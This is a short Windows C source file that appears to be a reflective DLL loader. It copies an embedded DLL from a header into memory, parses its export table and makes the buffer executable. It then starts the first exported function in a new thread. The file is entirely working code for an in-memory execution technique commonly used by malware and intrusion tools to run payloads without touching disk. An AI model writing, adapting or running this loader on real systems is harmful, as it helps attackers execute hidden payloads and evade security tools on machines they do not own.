#include <windows.h>
#include <stdio.h>
#include "boxreflect.h"

DWORD rvaToOffset(BYTE* base, DWORD rva) {
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + ((PIMAGE_DOS_HEADER)base)->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++)
        if (rva >= sec->VirtualAddress && rva < sec->VirtualAddress + sec->SizeOfRawData)
            return (rva - sec->VirtualAddress) + sec->PointerToRawData;
    return 0;
}

int main() {
    BYTE* buf = (BYTE*) VirtualAlloc(NULL, boxreflect_dll_len, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
    memcpy(buf, boxreflect_dll, boxreflect_dll_len);

    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(buf + ((PIMAGE_DOS_HEADER)buf)->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)(buf +
        rvaToOffset(buf, nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress));

    DWORD* names    = (DWORD*)(buf + rvaToOffset(buf, exp->AddressOfNames));
    WORD*  ords     = (WORD*) (buf + rvaToOffset(buf, exp->AddressOfNameOrdinals));
    DWORD* funcs    = (DWORD*)(buf + rvaToOffset(buf, exp->AddressOfFunctions));

    printf("[*] Found %d exports, first name: %s\n", exp->NumberOfNames,
        (char*)(buf + rvaToOffset(buf, names[0])));

    DWORD old;
    VirtualProtect(buf, boxreflect_dll_len, PAGE_EXECUTE_READ, &old);
    HANDLE h = CreateThread(NULL, 0,
        (LPTHREAD_START_ROUTINE)(buf + rvaToOffset(buf, funcs[ords[0]])),
        NULL, 0, NULL);
    printf("[*] Thread handle: %p\n", h);
    WaitForSingleObject(h, INFINITE);
    return 0;
}
